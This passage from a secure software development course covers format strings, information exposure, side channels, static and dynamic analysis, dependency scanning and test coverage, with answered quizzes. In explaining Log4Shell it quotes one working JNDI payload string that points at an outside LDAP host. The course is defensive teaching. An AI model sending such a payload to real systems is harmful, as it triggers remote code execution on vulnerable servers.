Most other programming languages’ format systems are not quite that dangerous, but they can still cause problems. The best solution is to make sure that an untrusted user cannot provide the format string. If circumstances require that you allow that, *make sure* that the system you use cannot allow a vulnerability, e.g., by only allowing specific kinds of formats (be sure to validate that!), or use a library that is specifically designed to be safely used with untrusted templates. Even in those cases, remember that if a user can control the output template, the user can produce a copious amount of output. Ensure that this is not a serious issue (e.g., by ensuring that only that same user sees the results from that template, so attackers only end up attacking themselves).

Many output formatting systems have a way to support internationalization (**i18n**) and localization (**l10n**). The widely-used **gettext()** system, for example, lets you select a string (including a format string or template) using the user’s current locale. The value of the locale would typically be provided by an untrusted user. However, that is okay as long as its only effect is to select between format strings or templates, all of which you know you can trust.

> 😱 STORY TIME: Log4Shell / log4j

> log4j is a software component written in Java that implements logging (recording events for later auditing and debugging). It is widely used for logging, including by Apple iPhones, Teslas, and Minecraft chat. Log4Shell (formally CVE-2021-44228) is an extremely serious vulnerability in the log4j 2.X series. In vulnerable versions of log4j, "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.” (NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) It's easy to trigger; an attacker can include logged text with forms like `${jndi:ldap://45.83.193.150:1389/Exploit}`. There were almost 8,000 tests in the log4j project, but none found this; the tests showed that expected functions worked, but didn't ensure that this undesired functionality would not work. This is an example of allowing untrusted users to control the output format, in this case enabling the execution of arbitrary code. Be wary of giving untrusted users this dangerous level of control!

#### Quiz 4.10: Format Strings and Templates

\>>Select all the true statement(s).<<

\[!x] Where practical, do not allow untrusted users to control the format/template used when formatting output.

\[x] C’s design presumes that format string parameters are from trusted sources.

\[ ] Having a mechanism to simplify output formatting is unusual in programming languages.

### Minimize Feedback / Information Exposure

Avoid giving security or sensitive information to untrusted users. If a request is privileged, simply succeed or fail, and if it fails just say that it failed and minimize information on why it failed. In short, minimize feedback to untrusted users if it might compromise security, and instead send the detailed information to audit trail logs. For example:

*   If your program requires some sort of user authentication (e.g., you are writing a network service or login program), give the user as little information as possible before they authenticate. In particular, avoid giving away the version number of your program before authentication. Otherwise, if a particular version of your program is found to have a vulnerability, then users who don’t upgrade from that version advertise to attackers that they are vulnerable.

*   If your program accepts a password, don’t echo the exact characters back; this creates another way passwords can be seen by others. In HTML forms, set the input type to password, which intentionally limits the feedback.

*   On a failed login, just say “*username or password failed*” or similar - don’t expose whether it was the username or the password that failed. That could tell the attacker that the username is valid, and makes further attacks easier.

*   If a user tries to create an account using an email address, don't tell the user if an account with that email address already exists. Similarly, if a user tries to do a password reset using an email address, don't tell the user if there is no account with that email address. Providing that information would allow an attacker to determine if a specific email address is being used (or not) by some existing account.

*   In general, don’t display sensitive/private data unless necessary at that point.

Implement audit logging early in development. Then, if you need to record more detailed information to aid debugging, report that information in the logs instead of displaying it to the user. Audit logs are really convenient for debugging (because they are designed to record useful information without interfering with normal operations), and you are more likely to include useful status information in the logs if they are developed in parallel with the rest of the program. They will also reduce the temptation to reveal too much to untrusted users.

Also, ensure that users cannot receive unauthorized information. Permissions and namespaces should be clearly set to prevent this.

🔔 Improper information exposure is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #20 and 2019 CWE Top 25 #4. It is identified as [CWE-200](https://cwe.mitre.org/data/definitions/200.html), *Exposure of Sensitive Information to an Unauthorized Actor* (aka *Information Exposure*).

#### Quiz 4.11: Minimize Feedback / Information Exposure

\>>If an untrusted user connects into your system over a network, and a request fails, you should provide them with a detailed stack trace. True or False?<<

( ) True

(x) False

\[Explanation]

We hope this was a really easy one. The problem is not just that this is a terrible user experience; it could also lead to a security breach. Untrusted users should normally be told if some request failed, but there is no reason they must see all that detail; that is what logs are for.

\[Explanation]

### Side-Channel Attacks

In some cases, the software you develop may send security-relevant output that you did not intend to send.

A *side-channel attack* is an attack where an attacker gains unauthorized information by exploiting how the software is implemented (instead of a weakness in an algorithm or a defect). There are many different kinds of side-channel attacks; here are some examples:

*   Timing attack — an attack based on measuring the time taken by different computations. It is even possible to perform some timing attacks over a network, since modern statistics can counter a significant amount of jitter.

*   Cache attack — an attack based on monitoring cache accesses, typically on a shared physical environment (such as cloud service).

*   Power-monitoring attack — an attack based on observing varying electrical power consumption.

*   Data remanence — an attack based on reading data after it was thought to be deleted.

Cryptographic systems are often the targets of these attacks, so libraries that implement cryptography should be specially implemented to try to counter such attacks. We will discuss this in more detail when we discuss cryptography.

If you need to counter these kinds of attacks, beyond what is required for cryptography, side-channel attacks can be difficult to thwart. If it is extremely important to counter side-channel attacks, it is often better to pay to eliminate the resource sharing and access that enable side channels. For example, if cache attacks are a serious concern, you may choose to use single-purpose hardware or pay a cloud provider to reduce sharing (e.g., to use a single-tenant architecture). Power-monitoring attacks can be countered by making it difficult for an attacker to measure electrical use.

Thankfully, other than attacks on cryptographic systems, side-channel attacks are less common today. Most developers need to focus on the other issues discussed in this course, and only then (in more specialized circumstances) do they need to worry about side-channel attacks. Attackers will typically not bother trying to implement a side-channel attack if the software is riddled with easier-to-find vulnerabilities such as XSS and buffer overflows.

# Part II: Final Exam

*   Not included as part of the free version of the course.

# PART III: Verification and More Specialized Topics

# Verification

This chapter describes how to verify for security, including the limitations of tools, the meaning of *static analysis* and *dynamic analysis*, and common types of tools such as security code scanners/static application security testing (SAST) tools, fuzzers, and web application scanners.

Learning objectives:

1.  Understand verification tools, including the issues of false positives and false negatives.

2.  Discuss common types of static analysis tools, including security code scanners/static application security testing (SAST) tools.

3.  Discuss common types of dynamic analysis tools, including fuzzers and web application scanners.

## Basics of Verification

### Verification Overview

Verification can be defined as determining whether or not something complies with its requirements (including regulations, specifications, and so on). Testing is one verification approach, but verification is more than testing. We want to verify (to some reasonable level) that our software is secure, just like we want to verify that our software does other things it is supposed to do.

#### Verification Approaches

There are two main technical categories of verification:

*   **Static analysis** is any approach for verifying software (including finding defects) without executing software. This includes tools that examine source code looking for vulnerabilities (e.g., source code vulnerability scanning tools). It also includes humans reading code, looking for problems.

*   **Dynamic analysis** is any approach for verifying software (including finding defects) by executing software on specific inputs and checking the results. Traditional testing is a kind of dynamic analysis. Fuzz testing, where you send many *random* inputs to a program to see if it does something it should not, is also an example of dynamic analysis.

Some people also have a category called *hybrid analysis* for approaches that combine both, while others will include hybrid approaches in the dynamic analysis category.

#### True and False Reports

There is a long history of using various kinds of detectors to detect important situations, many of which have nothing to do with software. Smoke detectors, for example, attempt to detect smoke from dangerous fires. Sadly, detectors are never perfect.

In security we often want to use tools that find and report certain kinds of vulnerabilities. Ideally, such a vulnerability detection tool would always report exactly the vulnerabilities you want it to report, and nothing else. Again, such ideals rarely occur in reality. So a tool may report something or not, and that report or non-report may be correct or incorrect, leading to 4 possibilities:

<table>
  <tr>
    <td><b>Analysis/tool report</b></td>
    <td><b>Report correct</b></td>
    <td><b>Report incorrect</b></td>
  </tr>
  <tr>
    <td><b>Reported</b> (a defect)</td>
    <td><i>True positive (TP)</i>: Correctly reported (a defect)</td>
    <td><i>False positive (FP)</i>: Incorrect report (of a “defect” that’s not a defect) (“Type I error”)</td>
  </tr>
  <tr>
    <td><b>Did not report</b> (a defect (there))</td>
    <td><i>True negative (TN)</i>: Correctly did not report (a given defect)</td>
    <td><i>False negative (FN)</i>: Incorrect because it failed to report (a defect) (“Type II error”)</td>
  </tr>
</table>

The reality is that there is usually a trade-off between false positives and false negatives. Tools can be designed or configured to have fewer false positives (incorrect reports), but that lack of sensitivity typically means that it will often have more false negatives (it will fail to report things that you might expect it to report). For more details, see the [*SATE V Report: Ten Years of Static Analysis Tool Expositions*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf), 2018.

#### Applying Tools

If you are adding a tool to an existing project, you may want to configure tools to greatly limit what they report, and focus just on the vulnerabilities you are most concerned about. This gives you time to learn how to *tune* the tool and understand its results. Then, once those results are addressed, increase the sensitivity of your tools or add more tools to detect more issues. There is no point in trying to detect more issues than you can deal with.

If you are adding tools to a newly-started project, you are often better off configuring your tools to be very sensitive. In a new project, you will not be overwhelmed by the reports, and you will immediately get feedback on the issues your tools can detect.

Where do you add these tools? In short, maximally add these tools to at least your continuous integration (CI) pipeline. That way, incremental changes will be repeatedly analyzed and security issues will be reported early.

Some tools are OSS, while others are proprietary. Some of the proprietary tools are expensive, but if you are using them to develop OSS, many tools and/or services are free to use or are available at a substantial discount.

So let’s look at some kinds of tools you can use to help make your software secure.

#### Quiz 1.1: Verification Overview

\>>When using tools to look for security vulnerabilities, there is normally a risk of “false negatives” - that is, failing to report vulnerabilities even when they are present and the tool is designed to find that kind of vulnerability. True or False?<<

(x) True

( ) False

## Static Analysis

### Static Analysis Overview

Static analysis is any approach for verifying software (including finding defects) without executing software. This includes humans who review code. It also includes tools that review source code, byte code, and/or machine code.

#### Human Review

Humans can be amazing at finding defects. This is one of the big potential advantages of open source software (OSS); since anyone can review OSS source code to find defects, there is a potential mass peer review. But humans have their downsides. Human time is expensive, humans get bored, and humans have “off” days where they are less effective (e.g., they might miss things). Different humans have different levels of effectiveness, too. It’s great to have humans review code, but you also want to support humans with tools that will find problems the humans may miss.

If you can get humans to review code, do so! But you may want to direct the humans to examine issues that tools are especially not good at. In particular, it is good to have people review the “entry points” (attack surface) across a trust boundary to ensure that every request is either authorized or rejected. Determining whether or not a request is authorized is not something most tools are good at (they lack the information to make the decision). What is more, if that analysis is too hard for humans, there is something wrong with the software - it should be relatively *easy* to answer that question on each entry point.

In general, if there are problems that tools are not good at finding, it may be best to modify your design so the problem cannot happen in the first place. For example, choose a memory-safe language or design a system component so only safe requests can be made. If that does not work, it may be wise to try to find or develop a tool to find it. That said, there will always be issues that tools will not work well for. If nothing else works, then work to focus the most powerful tool of all on the problem: people. But people’s time is limited, so where you can, try to not depend *solely* on human review.

🔔 A human review process for code and configuration changes, to minimize the chance that malicious code or configuration could be introduced into your software pipeline, is part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Human review processes can help counter *Broken Access Control*, 2017 OWASP Top 10 #5 and 2021 OWASP Top 10 #1.

So with that said, let’s start discussing tools to help us.

#### Generic Bug-Finding Tools: Quality Tools, Compiler Warnings, and Type-Checking Tools

Some tools examine source code, byte code, or machine code to look for generic “quality” problems. For example, they may look for misleading indentation, combinations of constructs that usually indicate a defect, or overly-long methods that may be hard to understand later. There are a large variety of these, including compiler warning flags, style checkers, and so on. The tools themselves are often cheap or free, and they often run quickly, because they typically don’t need to do a deep analysis.

These tools often don’t focus on security, but using them can still help improve security:

1.  Some defects they find are security vulnerabilities.

2.  There are reports that *clean* code is easier for other tools and humans to understand… so fixing the reported problems can make other approaches more effective.

If you are starting a new project, it is important to turn on as many of these tools (including compiler warnings) as soon as you can. If you turn them on early, you will see a few reports recommending a different approach and just use that instead. If you try to add them to an *existing* project, you will often see far too many issues to fix, even though the odds of any one being a serious problem is small. So if you have an existing project, you typically need to add these tools slowly, configuring them to only report a subset (such as only reports triggered by a change) and then slowly expanding what they report.

Similar comments apply to static type-checking. Some programming languages have built-in checks for statically-declared types. There are pros and cons to statically-declared types. It takes time to determine and specify types, so doing that can slow down initial development, which is a negative for small and throw-away programs. However, those static declarations can help automatically finding certain kinds of defects, as well as aid support tools and optimization. If you are using a programming language with static type-checking, work with the type system to use it to help find defects early.

That said, while these tools are often easy to use, they generally are not focused on security issues… and thus they often miss security issues. Let’s talk about tools that use static analysis specifically to find security vulnerabilities.

#### Security Code Scanners/Static Application Security Testing (SAST) Tools

Some tools analyze code specifically looking for vulnerabilities. They go by a variety of names, such as Static Application Security Testing (SAST) tools, security code scanners, security source code scanners (if they examine source code), binary code scanners (if they only examine executables), or just *static code analyzers*. Some people use the term SAST only when the tool analyzes source code (for more details, see [*The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/) by Fred Bals, 2018, and [*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html) by Thomas Scanlon, 2018), but we will not limit the term that way.

The idea behind these tools is that many vulnerabilities have specific patterns. A tool designed to look for those patterns can report similar kinds of vulnerabilities.

The patterns are generally heuristic, and different tools generally look for different patterns. So one tool can find *some* vulnerabilities, but don’t make the mistake of thinking that any one of these tools finds *all* vulnerabilities. In addition, each tool will only look for patterns relevant to a particular set of languages/environments. That means these tools are only good for languages/environments they are designed to support, and in addition, a tool might be better at one language than another. Even given multiple tools designed to support a given language, different tools will often find vulnerabilities that others miss.

If your primary goal is to find as many vulnerabilities as possible, it is best to use multiple tools, even multiple tools of the same kind, so that a vulnerability not detected by one tool might be detected by another. Unfortunately, using multiple tools can get expensive in money and effort. Some tools are expensive, and no matter what, it takes time to configure the tool for its particular use and to analyze its reports. As often happens, there is a trade-off; the set of tools you select will be strongly influenced by the resources available, as well as the expected likelihood and impact of unfound vulnerabilities.

Of course, not everything reported by any of these tools is an *actual* vulnerability. All of these tools have some risk of generating a false positive. For example, a tool might detect a vulnerability triggered by some input, but you may know that only a trusted user can control that input… so while the tool is correct in one sense, it is not actually a vulnerability. In many cases, it is best to fix the report anyway; people are often wrong when they say something “can’t” happen, and the software or its environment may change in the future (so fixing it will future-proof the software). If you are confident the report is a false positive, and “fixing” the code to eliminate the report is not worth the trouble, most such tools have a way to disable the report (e.g., via a comment in the source code). That way, the tool will stop reporting about it; otherwise the tool reports will over time only have a large set of false positives. Just make sure that you only disable a report if you are *certain* it is a false positive.

#### Specialized Security Code Scanners/SAST Tools

Some tools are designed to only look for one or a very few specific kinds of vulnerabilities. These are still security code scanners, aka SAST tools, but since they are specially written to perform that one specific analysis, they can sometimes be better at that one analysis than a more general-purpose tool designed to find many different kinds of vulnerabilities. In addition, some more general-purpose tools don’t look for these specific problems at all.

Here are some kinds of vulnerabilities that specialized SAST tools can detect:

*   Regular Expression Denial-of-Service (ReDoS) vulnerabilities (that is, regular expressions with terrible worst-case performance). You can look for terms like “ReDoS”, “evil regex”, and “safe regex”. These extract the regular expressions from source code, and then analyze the regular expressions.

*   Hardcoded credentials such as cryptographic keys and passwords. Tools that look for hardcoded credentials are sometimes called “secret scanners”.

🔔 Hardcoded credentials are such a common problem that they are 2021 CWE Top 25 #16, [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *Use of Hard-coded Credentials*. This is one reason why secret scanners have rapidly become popular.

#### Other Static Analysis Tools

There are many other kinds of static analysis tools.

One kind is so important that we will dedicate a whole separate section to it. The kind of analysis these tools do has a variety of names, including software composition analysis (SCA), dependency analysis, and origin analysis. No matter what it is called, it is important, so we will discuss that next.

#### Quiz 1.2: Static Analysis Overview

\>>Security code scanners/static application security testing (SAST) tools examine code to look for vulnerabilities. They can be very useful, but such a tool could report no vulnerabilities even on software with vulnerabilities. True or False?<<

(x) True

( ) False

\[Explanation]

This is true. They are useful, and in general you should use at least one such tool, but don’t be fooled into thinking that simply using such tools eliminates software vulnerabilities.

\[Explanation]

### Software Composition Analysis (SCA)/Dependency Analysis

One kind of static analysis tool is so important that we want to discuss it separately. The kind of analysis these tools do has a variety of names, including software composition analysis (SCA), dependency analysis, and origin analysis. No matter what it is called, it is important. Let’s first examine *why* it is important.

#### Need for SCA

Long ago, software developers wrote most of the software in their application. Today, that is almost never the case. Instead, software developers typically reuse software packages that are mostly written by others, and then write only the specialized functionality and the glue code necessary to make things work together in the way desired. This also applies to reusable software packages; these packages typically depend on packages, which depend on others, and so on. The same is true for standalone operating systems, virtual machine images, and container images - they often include a lot of software written by others.

There are clear advantages to reusing software. One advantage is that it saves a lot of time (and money) - you don’t have to develop that code! Another advantage is that a reused package is often especially good at that task (since someone spent time specifically to solve that problem); these packages often handle edge cases you might otherwise forget.

But when you reuse software, there is a downside: that software will have vulnerabilities in it. You should try to pick software that is likely to have fewer vulnerabilities. But in general, vulnerabilities *will* be found in the software you use directly and indirectly; those vulnerabilities will be publicly announced, and updates to those components that fix the vulnerabilities will be released. Because most reused software is OSS, some people and companies call this examining for OSS. That is not quite right, because it is actually an issue for any reused software, but it is understandable that people focus on OSS because most reused software is OSS.

🔔 Using known-vulnerable components is such a common problem that in 2013 OWASP added *Using Components with Known Vulnerabilities* to the OWASP Top 10. Using components with known vulnerabilities is 2017 OWASP Top 10 #9. Using vulnerable and outdated components is 2021 OWASP Top 10 #6.

It is inevitable that you will need to quickly update vulnerable reused components, so you need to *prepare* to quickly detect and do security updates for the reused software in your applications.

#### Preparing for the Inevitable: Vulnerabilities in Your Dependencies

A key part of your preparation is to use a tool that can determine what software you reuse, and report on any publicly-known vulnerabilities in those reused components. Tools that can identify reused components have various names including software composition analysis (SCA) tools, software component analysis tools, dependency analysis tools, or origin analysis tools. Historically, many of these tools were developed for legal review, to ensure that all the reused software is being used in conformance to their licenses, that the licenses (as used) are compatible, and that there are licenses for all of it. It is a very good idea to include this kind of license analysis whenever you try to include or update any reused software. But for our purposes, we will focus on the tools that compare this list of components (including their version numbers) with databases of known vulnerabilities.

There are publicly-available databases of software with publicly known vulnerabilities; an especially widely-used database is the US National Vulnerability Database (NVD). The NVD is a publicly-available database of publicly-known vulnerabilities, all identified by a CVE identifier (each vulnerability has a different CVE identifier) combined with a list of products and version numbers which are known to have that vulnerability. Some commercial vendors have their own databases as well.

So, all an SCA tool has to do, in theory, is figure out what components (and their versions) are present, look up each one in one or more databases, and report on matches. Even detecting the components is not always easy; sometimes reused components are not obvious (e.g., because they were copy and pasted in, instead of being properly handled using a package manager). Even more fundamentally, however, databases are constantly updated as new vulnerabilities are found. That means that reused software that had no known vulnerabilities earlier might now *have* a known vulnerability. Even if the vulnerability was publicly known earlier, that fact might not have been recorded in earlier versions of the database(s) used by the tool. So these tools must be periodically rerun, or have the comparisons rerun, so that you become aware of newly-found vulnerabilities.

You should avoid some bad behavior to make these tools more useful. Some developers copy reused code from other packages into their application, instead of using a package manager to automate identifying and updating reused packages. Even worse, developers sometimes *modify* these copies and/or check in these copies (creating a fork). Some SCA tools can actually examine code line-by-line, identify such likely copies, and connect them back to their sources (to help identify vulnerabilities). But such SCA tools are more complex, often expensive to buy and use, and trying to *update* that software is often quite difficult because everything is being done manually. In addition, such SCA tools must necessarily use heuristics to detect such situations, which may miss such components anyway.

It is far better to apply some good practices. First, when reusing software, use a package manager to manage it, one that records the specific version numbers in a standard format that you can record in your version control system. By using a standard format, you can use far simpler SCA tools, and the data will be more accurate. By using a package manager you can trivially cause a software update and check that the new set of components works.

But who decides how fast you need to update your reused components? That is a tricky question. Some people may say, “my company policy”, “my chief information security officer” (CISO), “my chief information office” (CIO), or something like that. All of those answers are wrong answers. If your goal is to have a secure system, then the correct answer is that the ***attackers*** *decide when you need to update*! That’s because you need to get the updated version deployed before an attacker exploits that vulnerability in your deployed system.

Speed is important when a component you depend on has a publicly-known vulnerability, and you *know* that this will happen sometimes. So trying to handle this completely manually is a mistake. You should instead make sure that:

1.  You have at least one SCA tool that automatically reports to you when there is a known vulnerability in a component that your system uses.

2.  You can easily update a component using a simple command, generally by telling a package manager to switch to a different version of that component and checking that change in.

3.  You can automatically test the modified configuration to ensure that updating the component does not break anything important.

4.  You can quickly deploy it (if you deploy directly) and/or distribute it (if you distribute the software to others).

If your automated tests are not good enough to make it acceptable to deploy updated components, then you have a serious security problem. Needing to update reused components is inevitable - not just a possibility - in most software. If the components you use are so out-of-date that you cannot update to a supported version, that is also a serious problem… because again, needing to update a component for a vulnerability is generally inevitable.

Like all tools, SCAs are prone to false positives. In particular, a component may have a vulnerability, but only when certain methods are used or only in certain configurations. If you don’t use the component in a way that the vulnerability can be exploited, then of course you don’t need to update the component. But this is a little misleading. It is often hard to be *certain* that you don’t need to do the update. In addition, if you have a proper process where you can easily update components ― and you need to ― then it often takes more time to determine (for sure) that the vulnerability is not exploitable than to just do the update. What’s more, time spent to figure this out may give an attacker time to exploit it if it is a real vulnerability. So it is often better to just update, even if it is not certain to be exploitable.

There are lots of SCAs available. If you use GitHub or GitLab, they provide some basic SCA reporting of known vulnerabilities in many components for free (assuming that you use a standard package management format they can process). Linux Foundation projects can use LFx (formerly CommunityBridge) which provides this service. There are a variety of suppliers that provide or sell such tools. This includes OWASP Dependency Check (which is OSS), Sonatype’s Nexus products, Synopsys’ Black Duck, Ion Channel Solutions, and Snyk. Some package managers include this capability or have a plug-in for it (e.g. Ruby’s **bundler** has **bundle-audit**). This is definitely *not* a complete list, and no doubt you will want to compare the options.

The key is that most software reuses other software, and that vulnerabilities will occasionally be found in that reused software.

#### Quiz 1.3: Software Composition Analysis (SCA)/Dependency Analysis

\>>Select all the true statement(s) about handling dependencies:<<

\[!x] Tools can be used to help you identify which software dependencies have publicly-known vulnerabilities.

\[ ] Software composition analysis (SCA) tools can be used to find all software dependencies with vulnerabilities. {{ selected: No, such tools attempt to determine the software dependencies, and then compare that to their database of known vulnerabilities. However, they might not identify all dependencies or the vulnerability might not be in their database. The vulnerability might not be publicly known, and even if it is, there is no guarantee that the tool database contains *all* publicly known vulnerabilities. }}

\[ ] To keep software secure in operations, update your reused components within the time required by your company policy. {{ selected: False, the *attacker* decides when you need to update. The updated version needs to be deployed before an attacker attacks that deployed system using that vulnerability. If your company policy says you have a week, and the attacker subverts your system within a day, your system was still subverted. }}

\[x] To keep software secure in operations, ensure that there are automatic reports of known vulnerabilities in your dependencies, that you can easily update dependencies, that you can automatically test the modified configuration, and that you can quickly deploy or distribute as appropriate.

\[ ] Automated tests are a nice-to-have, but not necessary for security, when you have dependencies. {{selected: False, because you must be prepared for a rapid update when a dependency has a publicly-known exploit. Without automated tests, it is impractical to rapidly gain enough confidence to deploy the update in time. }}

## Dynamic Analysis

### Dynamic Analysis Overview

Dynamic analysis is any approach for verifying software (including finding defects) by executing software on specific inputs and checking the results. We will look at a few kinds of tools that do this, but first, let’s discuss their limitations.

#### Limitations to Dynamic Analysis

All dynamic analysis tools have a fundamental limitation: it is impossible to evaluate all possible inputs in a reasonable amount of time. It is not even possible to evaluate a *reasonable subset*.

Let’s imagine a trivial program that adds two 64-bit integers. The number of possible inputs is (2^64)\*(2^64) = 2^128. If we ran tests with a 4GHZ processor, and could run and test each input in 5 cycles, it would take 13.5 x 10^21 years (13.5 zetta years) to fully test the program. Using 1 million 8-core processors does not help enough; that would reduce the time to 1.7 x 10^15 years (that is, 1.7 quadrillion years). Real programs have far more complex inputs than this, so testing even 0.00001% of all inputs of real programs is impossible in human lifetimes.

As a result, all dynamic analysis approaches must try to select a very small subset of possible inputs that still have a chance of detecting problems where they exist. They are often very effective. But dynamic analysis approaches cannot “prove” that anything works correctly in general; at best, they have a good chance of detecting problems.

#### Traditional Testing

The best-known dynamic analysis approach is traditional testing. You select specific inputs to send to a program, and check to see if the result is correct. You can test specific parts of a program, such as a method or function (this is called *unit testing*). You can also send sequences of inputs to the system integrated as a whole (*integration testing*). Most people combine unit and integration testing. Unit testing is fast and it can be easy to test many special cases, but unit testing often misses whole-system problems that integration testing is much more likely to detect. Since computers are much faster than they were decades ago, it is often best to focus on integration testing over unit testing, but both approaches have their place. The testing literature describes other kinds of testing, but for our purposes, these two approaches are enough to understand the issues.

If your software needs to work correctly, it is critically important that you have a good test suite of *automated* tests and apply that test suite in your continuous integration pipeline. By *good* we mean “relatively likely to detect serious problems in the software”. While this does not guarantee there are no errors, a good test suite greatly increases the probability of detection, and is especially important for detecting problems when you upgrade a reused component.

If you deliver software, and a defect is later found and fixed, for each fix you should think about adding another test for that situation. Often, defects that escape to the field indicate a kind of subtle mistake that might reoccur in a future version of the system. In that case, add test(s) so if that problem recurs, will be detected *before* releasing another version.

If you are contracting someone else to write (some of) your software, and you don’t want to be controlled by them later, you need to make sure that you not only get the application source code (and the rights to modify it further), but also get all the build instructions and tests necessary to be able to confidently change the software. After all, if you cannot easily build or test a software modification, there is no safe way to make modifications and ship it.

In theory, you can create manual tests, that is, write a detailed step-by-step manual procedure and have a human follow those test steps. In practice, manual tests are almost always “tests that won’t be done” because of their high costs and delay. Another problem with manual testing is that it *discourages* continuous testing, since it costs time and money to do those manual tests. So avoid manual testing in favor of automated testing where practical. In some cases you may need to do manual testing, but remember that every manual test is a test that will rarely (if ever) be done, making that test far less useful. Note that what we are describing as *manual tests* are different from *undirected manual analysis* (where humans use the software *without* a step-by-step process). Undirected manual analysis can be quite effective, but is completely different from manual tests as we have defined them here.

A tricky problem in testing is when a resource is not available. If the test requires some software, hardware, or data that you don’t have, you cannot directly test it. Typically, the best you can do in those cases is simulate it (e.g., with mocked software, simulated hardware, or a stand-in dataset). If that is the best you can do, it is usually worthwhile. But don’t confuse the simulation with reality; the test results may be misleading due to differences between the actual resource and its stand-in.

#### Traditional Testing for Security

From a security perspective, it is important to include tests for security requirements. In particular, test both “what should happen” and “what should not happen”. Often people forget to test *what should not happen* (aka negative testing). For example, where it applies, you should have a test to check “Can I read/write *without* being authorized to do so?” (the answer should be “no”) and “Can I access the system with an *invalid* certificate or no certificate at all?” (again, that should fail). It is very common for programs’ security to fail because they don’t properly check for authentication (2017 OWASP Top 10 #2) or authorization (2017 OWASP Top 10 #5), so make sure you have tests for that!

One approach to developing software is called *test-driven development* (TDD). To over-summarize, in TDD the tests for a new capability are written before the software to implement the capability. This has some advantages, in particular, it encourages writing useful tests that actually check what they are supposed to check, and it also encourages developing testable software. One potential problem with TDD is that many TDD practitioners fail to write *negative* tests. Some TDD guidance even argues that you should only write tests for the new capability and nothing else. This is terrible guidance, because sometimes some things should simply *never* be allowed to happen, and you still need to test for them. You can definitely write secure software using TDD, but you must include negative tests (tests for what the software must *not* do) if you apply TDD.

🔔 2021 OWASP Top 10 #7 is *Identification and Authentication Failures*. Inadequate authentication is such a common mistake that *Broken Authentication* is 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, and 2019 CWE Top 25 #13. It is [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *Improper Authentication*. *Missing Authentication for (specifically a) Critical Function* is 2021 CWE Top 25 #11 and 2019 CWE Top 25 #36 ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)). *Broken Access Control* (including authorization failures) is 2017 OWASP Top 10 #5.

#### Test Coverage

You can *always* write another test; how do you know when you have written enough tests? It takes time to create and maintain tests, and tests should only be added if they add value. This turns out to be a hard question, and much depends on how critical your software is.

Two simple measurements that can help you answer this question are *statement coverage* and *branch coverage*:

1.  Statement coverage is the percent of program statements that have been run by at least one test.

2.  Branch coverage is the percentage of branches that have been taken by at least one test. In an **if-then-else** construct, the **then** part is one branch and the **else** part is the other branch. In a loop, the *run the body* part is one branch and *do not run the body* is the other branch. In a switch (case) statement, each possibility is a branch.

Statement coverage and branch coverage combine dynamic analysis (test results) with static analysis (information about the code), so it is sometimes considered a *hybrid* approach. But no matter what you call it, these measurements do provide some information about how well a program is tested.

One potential problem with statement coverage and branch coverage is that some statements and branches may be unreachable for a variety of reasons. If a statement cannot be reached, you may want to insert the equivalent of “**assert(false)**” to inform tools and humans that this statement should never be reached. What you really want to know is the percent of *possible* branches and statements that were covered by tests.

As a rule of thumb, we believe that an automated test suite with less than 90% statement coverage or less than 80% branch coverage (over all automated tests) is a poor test suite. But this is merely a rule of thumb. Some experts think that larger numbers should be expected (some argue anything less than 100% of possible statements and branches is unacceptable). All other things being equal, larger numbers are good, but it is often much costlier to get those last few percent, and whether or not it is worth it depends on how important the software is. In many cases some statements or branches cannot be executed, and there may not be a way to indicate that to the measurement tools.

These test coverage measures warn you about statements and branches that are not being tested, and that information can be really valuable. From a security standpoint, coverage measures warn you about statements or branches that are not being run in tests, which suggests that either there are some important tests missing or the software is not working properly. Don’t just add a test; make sure you understand *why* something is not being covered.

For example, we earlier mentioned a dangerous vulnerability in many versions of Apple’s operating systems, formally named CVE-2014-1266 and informally called the “goto fail; goto fail;” vulnerability. The problem was that due to a duplicated **goto** statement, some code vital for checking security certificates was skipped. A statement coverage measure would have trivially detected that this security-critical code was not being run by any test, and that should have been enough warning to look into the problem.

A big problem with statement and branch coverage measures is that they can warn you about some bad automated test suites, but a bad test suite could still get 100% perfect scores. For example, a test suite might exercise all the branches and statements but not check if any of the answers were correct. That test suite would have 100% branch and statement coverage, and would also be a bad test suite. In addition, while they can tell you about whether or not existing code was tested, they cannot detect *missing* code. For example, if there is a special case that needs special handling, but nothing checks for that special case, typically these coverage measures cannot detect that.

In short: these coverage measures can be useful for warning about some problems, but they do not warn about all testing problems.

But there is more to dynamic analysis when you are interested in security. Let’s next look at fuzz testing.

#### Quiz 1.4: Dynamic Analysis Overview

\>>Select the true statement(s) about dynamic analysis including testing:<<

\[!] For high-quality software, ensure that the software is tested with all possible input values. {{ selected: That is completely impossible. We cannot even do that for software that just adds two 64-bit numbers, nevermind “real world” software. }}

\[x] Unit testing often misses whole-system problems that integration testing is much more likely to detect.

\[ ] Statement coverage measures the percentage of branches executed by some set of tests. {{ selected: No. Branch coverage measures branches, statement coverages measures statements. }}

\[ ] Every security test should ensure that the system performs an action when it has already been authorized to do so. {{ selected: No, though this is an admittedly sneaky question. It is probably more important for security to write tests to check that the system does NOT perform various actions when it is NOT authorized to do so. These kinds of tests, to ensure that something is NOT done when it’s not supposed to be done, are sometimes called “negative testing”. It is very important, for security, that these negative tests are part of your automated test suite. }}

\[x] If statements are not being exercised by your test suite, you should investigate to determine why, especially if they are important to security.

\[x] In general, statement and branch coverage cannot detect missing code, they can only report the percentage of *existing* code (by some metric) that is tested.

### Fuzz Testing

Fuzz testing is a different kind of dynamic analysis.

#### Fuzzing vs. Traditional Testing

In fuzz testing, you generate a large number of *random* inputs, run the program, and see if the program behaves badly (e.g., crashes or hangs). A key aspect of fuzzing is that it does *not* generally check if the program produces the correct answer; it just checks that certain reasonable behavior (like “does not crash”) occurs.

